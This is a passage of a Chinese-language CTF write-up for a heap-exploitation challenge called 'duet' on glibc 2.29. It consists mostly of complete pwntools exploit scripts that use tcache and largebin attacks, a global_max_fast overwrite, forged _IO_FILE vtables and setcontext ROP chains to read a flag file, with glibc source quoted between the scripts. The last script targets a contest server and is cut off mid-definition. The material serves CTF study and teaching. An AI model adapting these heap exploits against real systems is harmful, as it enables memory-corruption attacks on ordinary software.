PTR [rdi，看有误合适的gadget，这种方法需要审查的gadget数量较多，但是也还好，建议在第一种方法没找到的情况下再使用，可以找到一些复杂的带有条件跳转语句的gadget，_IO_wfile_sync中的这个gadget我就是这么找到的。(文件结构体中含有合适的gadget的概率较大) exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292#coding:utf-8from pwn import *import subprocessimport sys,os,stringelf_path = './duet'remote_libc_path = ''#P = ELF(elf_path)context(os='linux',arch='amd64')#context.terminal = ['terminator','-x','sh','-c']context.terminal = ['tmux','split','-h']#context.log_level = 'debug'local = 1if local == 1: p = process(elf_path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote() #libc = ELF(remote_libc_path)def debug(cmd): gdb.attach(p,cmd) pause()def one_gadget(filename): return map(int,subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))def new(idx,size,content): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('1') p.recvuntil('Instrument: ') if idx == 1: p.sendline('\xE7\x90\xB4\x00') else: p.sendline('\xE7\x91\x9F\x00') p.recvuntil('Duration: ') p.sendline(str(size)) p.recvuntil('Score: ') p.send(content.ljust(size,'\x00'))def delete(idx): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('2') p.recvuntil('Instrument: ') if idx == 1: p.sendline('\xE7\x90\xB4\x00') else: p.sendline('\xE7\x91\x9F\x00')def show(idx): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('3') p.recvuntil('Instrument: ') if idx == 1: p.sendline('\xE7\x90\xB4\x00') else: p.sendline('\xE7\x91\x9F\x00')def magic(size): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('5') p.recvuntil('\x3a\x20') p.sendline(str(size))for i in range(6): new(0,0x90,'\x00') delete(0)for i in range(7): new(0,0x80,'\x00') delete(0)for i in range(7): new(0,0x2e0,'\x00') delete(0)for i in range(7): new(0,0x1f0,'\x00') delete(0)for i in range(7): new(0,0xe0,'\x00') delete(0)for i in range(7): new(0,0x2f0,'\x00') delete(0)for i in range(7): new(0,0x190,'\x00') delete(0)for i in range(6): new(0,0xf0,'\x00') delete(0)new(0,0x190,'\x00')new(1,0x300,'\x00')delete(1)delete(0)new(0,0xf0,'\x00')delete(0)new(0,0x190,'\x00')new(1,0x1f0,'\x00')delete(0)new(0,0x100,'\x00')delete(0)payload = '\x00'*0xe8+p64(0x21)payload+= p64(0)+p64(0x21)payload+= p64(0)+p64(0x21)payload+= p64(0)+p64(0x21)payload+= p64(0)+p64(0x21)payload+= p64(0)+p64(0x21)payload+= p64(0)+p64(0x21)new(0,0x1f0,payload)magic(0xf1)#---------------------------------------------------------------------------------------delete(1)payload = '\x00'*0x1f8+p64(0x301)new(1,0x240,payload)delete(1)payload = (p64(0)+p64(0x21))*(0x300/0x10)new(1,0x300,payload)delete(1)show(0)p.recv(0x55)heapbase = u64(p.recv(8))-(0x55555555ea80-0x555555559000)log.success('heapbase = '+hex(heapbase))libcbase = u64(p.recv(8))-(0x7ffff7fb4d30-0x7ffff7dd0000)log.success('libcbase = '+hex(libcbase))global_max_fast = libcbase+(0x7ffff7fb7600-0x7ffff7dd0000)log.success('global_max_fast = '+hex(global_max_fast))delete(0)payload = '\x00'*0x48+p64(0xa1)+p64(heapbase+(0x55555555ea80-0x555555559000))+p64(global_max_fast-0x10)new(0,0x2f0,payload)new(1,0x90,'\x00')log.success('global_max_fast hijack success')delete(1)delete(0)payload = '\x00'*0x48+p64(0x201)new(0,0x2f0,payload)new(1,0x1f0,'\x00')delete(0)payload = '\x00'*0x48+p64(0x91)payload+= (p64(0)+p64(0x21))*(0x2a0/0x10)new(0,0x2f0,payload)delete(1)delete(0)payload = '\x00'*0x48+p64(0x91)payload+= p64(0x201)+p64(0x21)payload+= (p64(0)+p64(0x21))*(0x2a0/0x10-1)new(0,0x2f0,payload)new(1,0x80,'\x00') #put 0x201delete(0)payload = '\x00'*0x48+p64(0x201)payload+= (p64(0)+p64(0x21))*(0x2a0/0x10)new(0,0x2f0,payload)delete(1)main_arena = libcbase+(0x7ffff7fb4c40-0x7ffff7dd0000)delete(0)payload = '\x00'*0x48+p64(0x201)payload+= p64(main_arena+0x40)+p64(0)payload+= (p64(0)+p64(0x21))*(0x2a0/0x10-1)new(0,0x2f0,payload)delete(0)new(1,0x1f0,'\x00')payload = '\x00'*0x10payload+= p64(libcbase+libc.sym['__free_hook']-0xb58)+p64(0)payload+= p64(0)+p64(main_arena+0x60)payload+= p64(libcbase+libc.sym['__free_hook']-0xb68-1)+p64(0)payload+= '\x00'*0xd8+p64(0x2f1)payload+= p64(0)+p64(main_arena+0x160)new(0,0x1f0,payload)delete(1)new(1,0x2e0,'\x00'*0xd0+p64(0)+p64(0x21))delete(0)payload = '\x00'*0x10payload+= p64(libcbase+libc.sym['__free_hook']-0xb58)+p64(0)payload+= p64(0)+p64(main_arena+0x60) #main_arena+0x60payload+= p64(libcbase+libc.sym['__free_hook']-0xb68-1)+p64(0)payload+= '\x00'*0xd0payload+= p64(0)+p64(0x21)new(0,0x1f0,payload)delete(1)new(1,0xf0,'\x00'*0x9+p64(0x21001))delete(0)new(0,0x400,'\x00')delete(0)new(0,0x400,'\x00')delete(0)target = libcbase+libc.sym['__free_hook']-(0x7ffff7fb75a8-0x7ffff7fb7270)+0x10__IO_wfile_sync = libcbase+(0x7ffff7e59460-0x7ffff7dd0000)ret = libcbase+0x2535fsyscall = libcbase+0xcf6c5rax = libcbase+0x47cf8rdi = libcbase+0x26542rsi = libcbase+0x26f9erdx = libcbase+0x12bda6buf = heapbaseflag_addr = target+0x330rop = p64(rdi)+p64(flag_addr)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(2)+p64(syscall)#openrop+= p64(rdi)+p64(3)+p64(rsi)+p64(buf+0x300)+p64(rdx)+p64(0x300)+p64(rax)+p64(0)+p64(syscall)#readrop+= p64(rdi)+p64(1)+p64(rsi)+p64(buf+0x300)+p64(rdx)+p64(0x300)+p64(rax)+p64(1)+p64(syscall)#writepayload = p64(1)+p64(0)payload+= p64(0)+p64(0xffffffffffffffff)payload+= p64(target+0xb0)+p64(0)payload+= p64(libcbase+libc.sym['setcontext']+0x35)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(target+0x10) payload+= p64(target)+p64(0) #0xa0payload+= p64(0)+p64(0) #0xb0payload+= (p64(0)+p64(0))*9payload+= p64(target+0x170)+p64(ret)payload+= p64(0)*2payload+= roppayload = payload.ljust(0x328,'\x00')payload+= p64(__IO_wfile_sync)payload+= './flag\x00\x00'new(0,0x400,payload)delete(0)p.interactive()'''0x7ffff7e59462 &lt;__GI__IO_wfile_sync+2&gt;: push rbp0x7ffff7e59463 &lt;__GI__IO_wfile_sync+3&gt;: push rbx0x7ffff7e59464 &lt;__GI__IO_wfile_sync+4&gt;: mov rbx,rdi0x7ffff7e59467 &lt;__GI__IO_wfile_sync+7&gt;: sub rsp,0x100x7ffff7e5946b &lt;__GI__IO_wfile_sync+11&gt;: mov rax,QWORD PTR [rdi+0xa0]0x7ffff7e59472 &lt;__GI__IO_wfile_sync+18&gt;: mov rdx,QWORD PTR [rax+0x20]0x7ffff7e59476 &lt;__GI__IO_wfile_sync+22&gt;: mov rsi,QWORD PTR [rax+0x18]0x7ffff7e5947a &lt;__GI__IO_wfile_sync+26&gt;: cmp rdx,rsi0x7ffff7e5947d &lt;__GI__IO_wfile_sync+29&gt;: jbe 0x7ffff7e594ad &lt;__GI__IO_wfile_sync+77&gt;0x7ffff7e594ad &lt;__GI__IO_wfile_sync+77&gt;: mov rsi,QWORD PTR [rax]0x7ffff7e594b0 &lt;__GI__IO_wfile_sync+80&gt;: mov rax,QWORD PTR [rax+0x8]0x7ffff7e594b4 &lt;__GI__IO_wfile_sync+84&gt;: cmp rsi,rax0x7ffff7e594b7 &lt;__GI__IO_wfile_sync+87&gt;: je 0x7ffff7e59532 &lt;__GI__IO_wfile_sync+210&gt;0x7ffff7e594b9 &lt;__GI__IO_wfile_sync+89&gt;: sub rsi,rax0x7ffff7e594bc &lt;__GI__IO_wfile_sync+92&gt;: mov r12,QWORD PTR [rbx+0x98]0x7ffff7e594c3 &lt;__GI__IO_wfile_sync+99&gt;: sar rsi,0x20x7ffff7e594c7 &lt;__GI__IO_wfile_sync+103&gt;: mov rbp,rsi0x7ffff7e594ca &lt;__GI__IO_wfile_sync+106&gt;: mov rdi,r120x7ffff7e594cd &lt;__GI__IO_wfile_sync+109&gt;: call QWORD PTR [r12+0x20]0x7ffff7e25e35 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdx+0xa0]0x7ffff7e25e43 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdx+0x78]0x7ffff7e25e47 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdx+0x48]0x7ffff7e25e4b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdx+0x50]0x7ffff7e25e4f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdx+0x58]0x7ffff7e25e53 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdx+0x60]0x7ffff7e25e57 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdx+0xa8]0x7ffff7e25e5e &lt;setcontext+94&gt;: push rcx0x7ffff7e25e5f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdx+0x70]0x7ffff7e25e63 &lt;setcontext+99&gt;: mov rdi,QWORD PTR [rdx+0x68]0x7ffff7e25e67 &lt;setcontext+103&gt;: mov rcx,QWORD PTR [rdx+0x98]0x7ffff7e25e6e &lt;setcontext+110&gt;: mov r8,QWORD PTR [rdx+0x28]0x7ffff7e25e72 &lt;setcontext+114&gt;: mov r9,QWORD PTR [rdx+0x30]0x7ffff7e25e76 &lt;setcontext+118&gt;: mov rdx,QWORD PTR [rdx+0x88]0x7ffff7e25e7d &lt;setcontext+125&gt;: xor eax,eax0x7ffff7e25e7f &lt;setcontext+127&gt;: ret''' 解法二思路2.24的_IO_str_finish： 123456789void _IO_str_finish (_IO_FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);//函数指针 fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; 2.29的_IO_str_finish： 12345678void_IO_str_finish (FILE *fp, int dummy)&#123; if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)) free (fp-&gt;_IO_buf_base); //函数指针换位了标准还是free fp-&gt;_IO_buf_base = NULL; _IO_default_finish (fp, 0);&#125; 2.23的_IO_str_overflow： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960int_IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen) return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); //函数指针 if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf); //函数指针 /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow) 2.29的_IO_str_overflow： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int_IO_str_overflow (FILE *fp, int c)&#123; int flush_only = c == EOF; size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only)) &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen) return EOF; new_buf = malloc (new_size); //函数指针换为了标准函数malloc if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); free (old_buf);//函数指针换为了标准函数free /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow) 所以2.24的那一套利用已经不可行了。 但是比赛时Kirin大佬发现了一种新的可利用点，就是在_IO_str_jumps中存在malloc+memcpy+free。 所以可以先用chunk overlapping改一个已经被放进tcahce里的chunk的fd为__free_hook，然后用largebin_attack的任意地址写堆地址，改_IO_list_all到我们伪造的_IO_FILE上，我们需要伪造两个fake_IO_FILE，第一个负责把__free_hook给放入tcache尾部，第二个负责将其申请出来并将其中的数据改为劫持执行流的gadget。 这种方法在堆风水时让我加深了对chunk overlapping的理解，chunk overlapping是具有连环效应的，我自己这里是构造了三组相互覆盖的chunk，最好size是递增的，因为只有两个位置，所以需要将前面的free里才能有位置去申请新的，要是新的比旧的size小的话，就可能出现切割的情况，这是我们不想看到的。 感觉_IO_str_overflow+largebin_attack的方法在程序没有malloc的情况下可以通用，比改global_max_fast要简单一点。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#coding:utf-8from pwn import *import subprocessimport sys,os,stringelf_path = './duet'remote_libc_path = ''#P = ELF(elf_path)context(os='linux',arch='amd64')#context.terminal = ['terminator','-x','sh','-c']context.terminal = ['tmux','split','-h']#context.log_level = 'debug'local = 1if local == 1: p = process(elf_path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote() #libc = ELF(remote_libc_path)def debug(cmd): gdb.attach(p,cmd) pause()def one_gadget(filename): return map(int,subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))def new(idx,size,content): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('1') p.recvuntil('Instrument: ') if idx == 1: p.sendline('\xE7\x90\xB4\x00') else: p.sendline('\xE7\x91\x9F\x00') p.recvuntil('Duration: ') p.sendline(str(size)) p.recvuntil('Score: ') p.send(content.ljust(size,'\x00'))def delete(idx): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('2') p.recvuntil('Instrument: ') if idx == 1: p.sendline('\xE7\x90\xB4\x00') else: p.sendline('\xE7\x91\x9F\x00')def show(idx): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('3') p.recvuntil('Instrument: ') if idx == 1: p.sendline('\xE7\x90\xB4\x00') else: p.sendline('\xE7\x91\x9F\x00')def magic(size): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('5') p.recvuntil('\x3a\x20') p.sendline(str(size))for i in range(7): new(0,0x88,'\x00') delete(0)for i in range(7): new(0,0xf0,'\x00') delete(0) for i in range(7): new(0,0x1e0,'\x00') delete(0)for i in range(7): new(0,0x1f0,'\x00') delete(0)for i in range(7): new(0,0x220,'\x00') delete(0)for i in range(7): new(0,0x230,'\x00') delete(0)for i in range(7): new(0,0x250,'\x00') delete(0)for i in range(7): new(0,0x3f0,'\x00') delete(0)for i in range(6): new(0,0x400,'\x00') delete(0)new(0,0x88,'\x00')new(1,0xf0,'\x00')delete(0)magic(0xf1)new(0,0x1f0,'\x00'*0xe0+(p64(0)+p64(0x21))*3)delete(1)payload = '\x00'*0xf8+p64(0x91)+'\x00'*0x80+(p64(0)+p64(0x21))*3new(1,0x1e0,payload)delete(0)show(1)p.recv(0x105)libcbase = u64(p.recv(8))-(0x7ffff7fb4ca0-0x7ffff7dd0000)log.success('libcbase = '+hex(libcbase))new(0,0x80,'\x00')delete(1)new(1,0x1e0,'\x00'*0xf8+p64(0x231))delete(1)new(1,0x230,'\x00'*0x20+(p64(0)+p64(0x21))*3)delete(0)new(0,0x3e0,'\x00'*0x10+3*(p64(0)+p64(0x21))+'\x00'*0x170+(p64(0)+p64(0x21))*3)delete(0)payload = '\x00'*0xe0+p64(0x1f0)+p64(0x21)+2*(p64(0)+p64(0x21))+'\x00'*0xe8+p64(0x261)new(0,0x220,payload)delete(1)new(1,0x250,'\x00'*0x20+3*(p64(0)+p64(0x21))+'\x00'*0x1b0+3*(p64(0)+p64(0x21))+p64(0)+p64(0x3f1)+p64(libcbase+libc.sym['__free_hook']))delete(0)payload = '\x00'*0xe0+p64(0x1f0)+p64(0x21)+2*(p64(0)+p64(0x21))+'\x00'*0xe8+p64(0x401)new(0,0x220,payload)delete(1)new(1,0x400,'\x00')delete(1)new(1,0x1e0,'\x00'*0xf8+p64(0x411))show(0)p.recv(0x215)heapbase = u64(p.recv(8))-(0x555555562070-0x555555559000)log.success('heapbase = '+hex(heapbase))ret = libcbase+0x2535fsyscall = libcbase+0xcf6c5rax = libcbase+0x47cf8rdi = libcbase+0x26542rsi = libcbase+0x26f9erdx = libcbase+0x12bda6buf = heapbaseflag_addr = heapbase+(0x555555561e30-0x555555559000)rop = p64(rdi)+p64(flag_addr)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(2)+p64(syscall)#openrop+= p64(rdi)+p64(3)+p64(rsi)+p64(buf+0x300)+p64(rdx)+p64(0x300)+p64(rax)+p64(0)+p64(syscall)#readrop+= p64(rdi)+p64(1)+p64(rsi)+p64(buf+0x300)+p64(rdx)+p64(0x300)+p64(rax)+p64(1)+p64(syscall)#writedelete(0)payload = '\x00'*0xe0+3*(p64(0)+p64(0x21))payload+= p64(0)*5+p64(0x7fffffffffff)+p64(0)+p64(heapbase+(0x555555561d80-0x555555559000))+p64(0x1be+heapbase+(0x555555561d80-0x555555559000))+p64(0)*4payload+= p64(0xdeadbeef)+'\x00'*0x68+p64(libcbase+(0x7ffff7fb6620-0x7ffff7dd0000))payload+= p64(0)+p64(0x401)payload+= 2*p64(libcbase+(0x00007ffff7fb5090-0x7ffff7dd0000))payload+= p64(0xdeadbeefdeadbeef)+p64(libcbase+libc.sym['_IO_list_all']-0x20)+ropnew(0,0x400,payload)delete(0)delete(1)_IO_str_jumps = libcbase+(0x7ffff7fb6620-0x7ffff7dd0000)fake_IO_buf_base = heapbase+(0x555555561f70-0x555555559000)fake_chain = heapbase+(0x555555561f90-0x555555559000)payload = p64(0)*3+p64(0x7fffffffffff)+p64(0)+p64(fake_IO_buf_base)+p64(0x1be+fake_IO_buf_base)+p64(0)*4payload+= p64(fake_chain)+'\x00'*0x68+p64(_IO_str_jumps)target = heapbase+(0x555555561d80-0x555555559000)content = p64(libcbase+0x150550)+p64(target)content+= p64(0)+p64(0)content+= p64(libcbase+libc.sym['setcontext']+0x35)+p64(0)content+= '\x00'*(0xa0-0x30)content+= p64(heapbase+(0x5555555620a0-0x555555559000))+p64(ret)+'./flag\x00\x00'content = content.ljust(0xf0,'\x11')new(1,0x1e0,content+p64(0)+p64(0x411)+payload)p.recvuntil('\x75\x0a\x3a\x20')p.sendline('6')p.interactive() 解法三思路结合解法一和解法二的优势，我个人感觉应该是目前为止最简单的方法了，exp的长度也比较短。 就是类似于2.24下_IO_str_overflow的方法，只不过这里的函数换成了_IO_wfile_sync，虚表指针也从_IO_str_jumps变为了_IO_wfile_jumps+72。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192#coding:utf-8from pwn import *import subprocessimport sys,os,stringelf_path = './duet'remote_libc_path = ''#P = ELF(elf_path)context(os='linux',arch='amd64')#context.terminal = ['terminator','-x','sh','-c']context.terminal = ['tmux','split','-h']#context.log_level = 'debug'local = 1if local == 1: p = process(elf_path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote() #libc = ELF(remote_libc_path)def debug(cmd): gdb.attach(p,cmd) pause()def one_gadget(filename): return map(int,subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))def new(idx,size,content): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('1') p.recvuntil('Instrument: ') if idx == 1: p.sendline('\xE7\x90\xB4\x00') else: p.sendline('\xE7\x91\x9F\x00') p.recvuntil('Duration: ') p.sendline(str(size)) p.recvuntil('Score: ') p.send(content.ljust(size,'\x00'))def delete(idx): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('2') p.recvuntil('Instrument: ') if idx == 1: p.sendline('\xE7\x90\xB4\x00') else: p.sendline('\xE7\x91\x9F\x00')def show(idx): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('3') p.recvuntil('Instrument: ') if idx == 1: p.sendline('\xE7\x90\xB4\x00') else: p.sendline('\xE7\x91\x9F\x00')def magic(size): p.recvuntil('\x75\x0a\x3a\x20') p.sendline('5') p.recvuntil('\x3a\x20') p.sendline(str(size))for i in range(7): new(0,0x88,'\x00') delete(0)for i in range(7): new(0,0xf0,'\x00') delete(0) for i in range(7): new(0,0x1e0,'\x00') delete(0)for i in range(7): new(0,0x1f0,'\x00') delete(0)for i in range(7): new(0,0x220,'\x00') delete(0)for i in range(7): new(0,0x230,'\x00') delete(0)for i in range(7): new(0,0x250,'\x00') delete(0)for i in range(7): new(0,0x3f0,'\x00') delete(0)for i in range(6): new(0,0x400,'\x00') delete(0)new(0,0x88,'\x00')new(1,0xf0,'\x00')delete(0)magic(0xf1)new(0,0x1f0,'\x00'*0xe0+(p64(0)+p64(0x21))*3)delete(1)payload = '\x00'*0xf8+p64(0x91)+'\x00'*0x80+(p64(0)+p64(0x21))*3new(1,0x1e0,payload)delete(0)show(1)p.recv(0x105)libcbase = u64(p.recv(8))-(0x7ffff7fb4ca0-0x7ffff7dd0000)log.success('libcbase = '+hex(libcbase))new(0,0x80,'\x00')delete(1)new(1,0x1e0,'\x00'*0xf8+p64(0x231))delete(1)new(1,0x230,'\x00'*0x20+(p64(0)+p64(0x21))*3)delete(0)new(0,0x3e0,'\x00'*0x10+3*(p64(0)+p64(0x21))+'\x00'*0x170+(p64(0)+p64(0x21))*3)delete(0)payload = '\x00'*0xe0+p64(0x1f0)+p64(0x21)+2*(p64(0)+p64(0x21))+'\x00'*0xe8+p64(0x261)new(0,0x220,payload)delete(1)new(1,0x250,'\x00'*0x20+3*(p64(0)+p64(0x21))+'\x00'*0x1b0+3*(p64(0)+p64(0x21))+p64(0)+p64(0x3f1)+p64(libcbase+libc.sym['__free_hook']))delete(0)payload = '\x00'*0xe0+p64(0x1f0)+p64(0x21)+2*(p64(0)+p64(0x21))+'\x00'*0xe8+p64(0x401)new(0,0x220,payload)delete(1)new(1,0x400,'\x00')delete(1)new(1,0x1e0,'\x00'*0xf8+p64(0x411))show(0)p.recv(0x215)heapbase = u64(p.recv(8))-(0x555555562070-0x555555559000)log.success('heapbase = '+hex(heapbase))ret = libcbase+0x2535fsyscall = libcbase+0xcf6c5rax = libcbase+0x47cf8rdi = libcbase+0x26542rsi = libcbase+0x26f9erdx = libcbase+0x12bda6buf = heapbaseflag_addr = heapbase+(0x555555561f50-0x555555559000)rop = p64(rdi)+p64(flag_addr)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(rax)+p64(2)+p64(syscall)#openrop+= p64(rdi)+p64(3)+p64(rsi)+p64(buf+0x300)+p64(rdx)+p64(0x300)+p64(rax)+p64(0)+p64(syscall)#readrop+= p64(rdi)+p64(1)+p64(rsi)+p64(buf+0x300)+p64(rdx)+p64(0x300)+p64(rax)+p64(1)+p64(syscall)#writedelete(0)payload = '\x00'*0xe0+3*(p64(0)+p64(0x21))payload+= '\x00'*0xe0payload+= p64(0)+p64(0x401)payload+= 2*p64(libcbase+(0x00007ffff7fb5090-0x7ffff7dd0000))payload+= p64(0xdeadbeefdeadbeef)+p64(libcbase+libc.sym['_IO_list_all']-0x20)+ropnew(0,0x400,payload)delete(0)delete(1)new_rsp = heapbase+(0x5555555620a0-0x555555559000)target = heapbase+(0x555555561e70-0x555555559000)_IO_wfile_jumps = libcbase+(0x7ffff7fb6068-0x7ffff7dd0000)payload = p64(0)+p64(1)payload+= p64(libcbase+libc.sym['setcontext']+0x35)+p64(0x7fffffffffff)payload+= p64(target+0x10)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(0)payload+= p64(0)+p64(target)payload+= p64(target+0x10)+p64(0) #0xa0payload+= p64(new_rsp)+p64(ret) #0xb0payload+= p64(0)+p64(0) payload+= p64(0)+p64(_IO_wfile_jumps)+'./flag'new(1,0x1e0,'\x00'*0xf0+p64(0)+p64(0x411)+payload)p.recvuntil('\x75\x0a\x3a\x20')p.sendline('6')p.interactive() 其他r3kapig的exp最后的劫持用了一串比较复杂的gadget，虽然不推荐使用，但是作为收藏还是放到这里。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231#coding:utf-8from pwn import *debug = 1if debug: # p = process(['docker', 'run', '-i', '0c23e3923320']) #p = process(['chroot', './duet', '/duet'], aslr=False) p = process('./duet')else: p = remote('pwnable.org', 12356)context.terminal = ['tmux','split','-h']ins_map = ['琴', '瑟']def alloc(t,l,c): p.sendlineafter(':', '1') p.sendlineafter(':', ins_map[t]) p.sendlineafter(':', str(l)) if len(c) &lt; l: if isinstance(c, bytes): c = c.ljust(l, b'\x00') elif isinstance(c, str): c = c.ljust(l, '\x00') p.sendafter(':', c)def free(t): p.sendlineafter(':', '2') p.sendlineafter(':', ins_map[t])def show(t): p.sendlineafter(':', '3') p.sendlineafter(':', ins_map[t])def 